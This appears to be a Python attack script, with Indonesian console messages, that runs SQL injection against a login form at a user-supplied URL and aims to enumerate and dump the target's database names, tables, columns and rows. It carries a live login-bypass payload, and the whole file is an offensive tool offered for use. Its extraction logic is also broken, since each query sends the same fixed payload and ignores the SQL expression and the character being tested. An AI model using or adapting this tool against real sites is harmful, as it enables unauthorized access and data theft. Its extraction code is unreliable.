import requests
import string
import os
import color as c
import header
from tabulate import tabulate

# id_user=whoami&passw=whoami
USERNAME_FIELD = "id_user"
PASSWORD_FIELD = "passw"
DUMMY_PASSWORD = "bebas123"


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_payload(target_url, username_payload):
    data = {
        USERNAME_FIELD: username_payload,
        PASSWORD_FIELD: DUMMY_PASSWORD
    }
    try:
        response = requests.post(target_url, data=data, timeout=10, allow_redirects=False)
        return response
    except Exception as e:
        print(f"{c.bold}{c.red}[!] Error: {e}")
        return None

def is_successful(response):
    return response is not None and response.status_code == 302 and "Location" in response.headers

def extract_string(target_url, sql_expression, max_length=30):
    result = ""
    charset = string.ascii_letters + string.digits + "_@$.-"
    print(f"{c.bold}[{c.green}+{c.reset}{c.bold}] Ekstrak : ", end='', flush=True)
    for i in range(1, max_length + 1):
        found = False
        for char in charset:
            payload = "' OR '1'='1' -- -"
            response = send_payload(target_url, payload)
            if is_successful(response):
                result += char
                print(char, end='', flush=True)
                found = True
                break
        if not found:
            break
    print()
    return result


def get_table_names(target_url, database_name):
    print(f"\n{c.bold}[{c.b_yellow}-{c.reset}{c.bold}] Mencari nama tabel di database : {database_name}")
    table_names = []
    for index in range(0, 10):
        sql = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {index},1"
        name = extract_string(target_url, sql)
        if name:
            table_names.append(name)
        else:
            break
    return table_names

def get_column_names(target_url, table_name):
    print(f"\n{c.bold}[{c.b_yellow}-{c.reset}{c.bold}] Mencari nama kolom di tabel : {table_name}")
    column_names = []
    for index in range(0, 10):
        sql = f"SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}' LIMIT {index},1"
        name = extract_string(target_url, sql)
        if name:
            column_names.append(name)
        else:
            break
    return column_names


def dump_data(target_url, table, columns):
    print(f"\n{c.bold}[{c.b_yellow}-{c.reset}{c.bold}] Mengambil data dari tabel : {table}")
    all_rows = []
    row_index = 0 

    while True:
        row_data = []
        for col in columns:
            sql = f"SELECT {col} FROM {table} LIMIT {row_index},1"
            val = extract_string(target_url, sql)
            row_data.append(val)

        if any(row_data):
            all_rows.append(row_data)
            row_index += 1
        else:
            break

    print(f"\n[{c.green}DONE{c.reset}{c.bold}] Total baris: {len(all_rows)}")
    
    headers_colored = [f"{col}" for col in columns]
    print(tabulate(all_rows, headers=headers_colored, tablefmt="grid"))



if __name__ == "__main__":
    while True:
        clear_screen()
        header.header()

        try:
            target_url = input(f"{c.bold}[?] Masukkan target URL : {c.reset}").strip()

            print(f"\n{c.bold}[{c.b_yellow}-{c.reset}{c.bold}] Mencari nama database bos...")
            db_name = extract_string(target_url, "database()")

            if not db_name:
                print(f"{c.bold}[!] Alamak najisnya! Target kemungkinan aman dari SQL Injection.")
                break  

            print(f"{c.bold}[{c.b_cyan}✓{c.reset}{c.bold}] Database: {db_name}")

            tables = get_table_names(target_url, db_name)
            if not tables:
                print(f"{c.bold}[!] Tidak ada tabel ditemukan dalam database.")
                break

            print(f"{c.bold}[{c.b_cyan}✓{c.reset}{c.bold}] Tabel ditemukan: {tables}")

            for table in tables:
                columns = get_column_names(target_url, table)
                filtered_columns = [col for col in columns if col not in ['user', 'current_connections', 'total_connections']]

                if filtered_columns:
                    print(f"{c.bold}[{c.b_cyan}✓{c.reset}{c.bold}] Kolom di {table}: {filtered_columns}")
                    dump_data(target_url, table, filtered_columns)
                else:
                    print(f"{c.bold}[!] Tidak ada kolom valid ditemukan dalam tabel: {table}")


            print(f"\n{c.bold}[{c.b_cyan}✓{c.reset}{c.bold}] Proses selesai. Keluar dari program.")
            break

        except KeyboardInterrupt:
            print(f"\n{c.bold}[{c.b_red}!{c.reset}{c.bold}] Dibatalkan oleh user. Keluar dari program.")
            break


